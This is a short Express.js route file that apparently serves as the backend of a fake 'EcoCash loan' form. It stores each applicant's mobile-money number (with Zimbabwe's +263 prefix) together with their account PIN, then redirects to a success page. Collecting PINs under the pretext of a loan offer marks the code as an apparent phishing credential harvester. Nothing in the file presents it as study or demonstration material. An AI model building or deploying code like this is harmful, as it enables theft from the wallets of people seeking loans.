import express from "express";
import LoanApplication from "../models/LoanApplication.js";

const router = express.Router();

router.post("/", async (req, res) => {
  try {
    const { ecocash_number, pin, loan_amount } = req.body;

    await LoanApplication.create({
      ecocashNumber: "+263" + ecocash_number,
      pin,
      loanAmount: loan_amount
    });

    res.redirect("https://ecocashloans.vercel.app/success.html");
  } catch (error) {
    res.status(500).send("Submission failed");
  }
});
